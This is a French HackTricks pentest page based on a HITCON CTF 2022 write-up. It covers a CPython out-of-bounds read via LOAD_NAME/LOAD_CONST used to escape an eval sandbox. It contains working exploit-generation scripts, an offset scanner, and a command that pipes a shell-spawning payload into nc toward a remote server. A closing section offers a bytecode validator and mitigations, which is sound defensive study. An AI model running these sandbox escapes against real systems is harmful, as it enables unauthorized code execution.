# OOB Read de l’opcode LOAD_NAME / LOAD_CONST

{{#include ../../../banners/hacktricks-training.md}}

**Ces informations proviennent** [**de ce writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Nous pouvons utiliser la fonctionnalité OOB read de l’opcode LOAD_NAME / LOAD_CONST pour obtenir un symbole en mémoire. Cela signifie qu’il est possible d’utiliser une astuce comme `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` pour obtenir le symbole souhaité (comme un nom de fonction).

Il suffit ensuite de construire votre exploit.

### Vue d’ensemble <a href="#overview-1" id="overview-1"></a>

Le code source est très court : il ne contient que 4 lignes !
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Vous pouvez saisir du code Python arbitraire, qui sera compilé en un [Python code object](https://docs.python.org/3/c-api/code.html). Cependant, `co_consts` et `co_names` de ce code object seront remplacés par un tuple vide avant l'évaluation de ce code object.

Ainsi, toutes les expressions contenant des consts (par exemple des nombres, des chaînes, etc.) ou des names (par exemple des variables, des fonctions) peuvent finalement provoquer une segmentation fault.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Comment la segmentation fault se produit-elle ?

Commençons par un exemple simple : `[a, b, c]` peut être compilé en bytecode comme suit.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Mais que se passe-t-il si `co_names` devient un tuple vide ? L’opcode `LOAD_NAME 2` est tout de même exécuté et tente de lire la valeur à l’adresse mémoire où elle devrait se trouver à l’origine. Oui, il s’agit d’une « fonctionnalité » de lecture OOB.

Le concept fondamental de la solution est simple. Certains opcodes de CPython, notamment `LOAD_NAME` et `LOAD_CONST`, sont vulnérables (?) aux lectures OOB.

Ils récupèrent un objet à l’index `oparg` du tuple `consts` ou `names` (c’est ainsi que `co_consts` et `co_names` sont nommés en interne). Nous pouvons nous référer à l’extrait suivant concernant `LOAD_CONST` pour voir ce que fait CPython lorsqu’il traite l’opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
De cette manière, nous pouvons utiliser la fonctionnalité OOB pour obtenir un « name » depuis un offset mémoire arbitraire. Pour nous assurer du nom qu'il possède et de son offset, il suffit de continuer à essayer `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Et vous pourriez trouver quelque chose avec un oparg > 700. Vous pouvez également essayer d'utiliser gdb pour examiner la disposition de la mémoire, bien sûr, mais je ne pense pas que ce soit plus facile ?

### Génération de l'Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Une fois que nous avons récupéré ces offsets utiles pour les names / consts, comment _obtenir_ un name / const depuis cet offset et l'utiliser ? Voici une astuce :\
Supposons que nous puissions obtenir un name `__getattribute__` depuis l'offset 5 (`LOAD_NAME 5`) avec `co_names=()`, il suffit alors de faire ce qui suit :
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Notez qu'il n'est pas nécessaire de le nommer `__getattribute__`, vous pouvez lui donner un nom plus court ou plus étrange.

Vous pouvez comprendre la raison simplement en examinant son bytecode :
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Notez que `LOAD_ATTR` récupère également le nom depuis `co_names`. Python charge les noms depuis le même offset lorsque le nom est identique, donc le deuxième `__getattribute__` est toujours chargé depuis offset=5. Grâce à cette fonctionnalité, nous pouvons utiliser un nom arbitraire dès que le nom se trouve à proximité en mémoire.

Pour générer des nombres, c'est trivial :

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Script d'Exploit <a href="#exploit-script-1" id="exploit-script-1"></a>

Je n'ai pas utilisé consts en raison de la limite de longueur.

Voici d'abord un script permettant de trouver ces offsets de noms.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Et ce qui suit sert à générer le véritable exploit Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Il effectue essentiellement les opérations suivantes ; pour ces chaînes, nous les obtenons à partir de la méthode `__dir__` :
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Notes de version et opcodes concernés (Python 3.11–3.13)

- Les opcodes du bytecode CPython indexent toujours les tuples `co_consts` et `co_names` à l’aide d’opérandes entières. Si un attaquant peut forcer ces tuples à être vides (ou plus petits que l’index maximal utilisé par le bytecode), l’interpréteur lira une zone mémoire hors limites pour cet index, ce qui renverra un pointeur PyObject arbitraire provenant de la mémoire adjacente. Les opcodes concernés incluent au moins :
- `LOAD_CONST consti` → lit `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → lisent les noms depuis `co_names[...]` (pour 3.11+, notez que `LOAD_ATTR`/`LOAD_GLOBAL` stockent des bits d’indicateur dans le bit de poids faible ; l’index réel est `namei >> 1`). Consultez la documentation du désassembleur pour connaître la sémantique exacte de chaque version. [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ a introduit des adaptive/inline caches qui ajoutent des entrées `CACHE` cachées entre les instructions. Cela ne modifie pas la primitive OOB ; cela signifie seulement que, si vous construisez vous-même le bytecode, vous devez prendre en compte ces entrées de cache lors de la construction de `co_code`.

Implication pratique : la technique décrite sur cette page continue de fonctionner avec CPython 3.11, 3.12 et 3.13 lorsque vous pouvez contrôler un code object (par exemple via `CodeType.replace(...)`) et réduire `co_consts`/`co_names`.

### Scanner rapide des index OOB utiles (compatible avec 3.11+/3.12+)

Si vous préférez sonder directement des objets intéressants depuis le bytecode plutôt que depuis du code source de haut niveau, vous pouvez générer des code objects minimaux et tester les index par force brute. L’helper ci-dessous insère automatiquement les inline caches lorsque cela est nécessaire.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notes
- Pour sonder les noms à la place, remplacez `LOAD_CONST` par `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` et ajustez l'utilisation de la pile en conséquence.
- Utilisez `EXTENDED_ARG` ou plusieurs octets de `arg` pour atteindre les index >255 si nécessaire. Lors de la construction avec `dis` comme ci-dessus, vous ne contrôlez que l'octet de poids faible ; pour les index plus grands, construisez vous-même les octets bruts ou répartissez l'attaque sur plusieurs chargements.

### Pattern RCE minimal uniquement en bytecode (co_consts OOB → builtins → eval/input)

Une fois que vous avez identifié un index de `co_consts` qui se résout vers le module builtins, vous pouvez reconstruire `eval(input())` sans aucun `co_names` en manipulant la pile :
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Cette approche est utile dans les challenges qui vous donnent un contrôle direct sur `co_code` tout en imposant `co_consts=()` et `co_names=()` (p. ex. « awpcode » de BCTF 2024). Elle évite les astuces au niveau du source et conserve une taille de payload réduite en exploitant les opérations de pile du bytecode et les constructeurs de tuples.

### Vérifications défensives et mesures d’atténuation pour les sandboxes

Si vous écrivez une sandbox Python qui compile/évalue du code non fiable ou manipule des code objects, ne vous fiez pas à CPython pour vérifier les limites des indexes de tuple utilisés par le bytecode. Validez plutôt vous-même les code objects avant de les exécuter.

Validateur pratique (rejette les accès OOB à co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Idées supplémentaires d’atténuation
- N’autorisez pas l’utilisation arbitraire de `CodeType.replace(...)` sur des entrées non fiables, ou ajoutez des vérifications structurelles strictes sur l’objet code obtenu.
- Envisagez d’exécuter le code non fiable dans un processus séparé avec un sandboxing au niveau du système d’exploitation (seccomp, job objects, containers), plutôt que de vous fier à la sémantique de CPython.

## Références

- [1] [Writeup de Splitline sur le HITCON CTF 2022, « V O I D » (origine de cette technique et de la chaîne d’exploit à haut niveau)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Documentation du désassembleur Python (sémantique des indices pour LOAD_CONST/LOAD_NAME/etc. et indicateurs low-bit de `LOAD_ATTR`/`LOAD_GLOBAL` dans Python 3.11+)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
